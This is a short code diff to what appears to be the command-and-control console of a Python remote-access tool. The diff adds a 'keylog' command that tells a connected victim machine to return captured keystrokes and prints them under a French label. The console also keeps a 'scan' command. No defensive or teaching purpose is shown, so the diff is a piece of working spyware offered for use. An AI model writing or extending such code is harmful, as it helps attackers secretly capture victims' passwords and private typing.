@@ -46,12 +46,19 @@ def send_commands(conn):
 
     while True:
 
-        cmd = input()
+        cmd = input(">>")
         # if the command is quit, close the connection
         if cmd == 'quit': 
             conn.close()
             s.close()
             sys.exit()
+
+        elif cmd == 'keylog':
+            conn.send(str.encode(cmd))
+            print("Récupération des frappes clavier :\n")
+            response = conn.recv(4096).decode("utf-8")
+            print(response)
+            continue
 
         elif cmd.startswith("scan"):
             conn.send(str.encode(cmd))
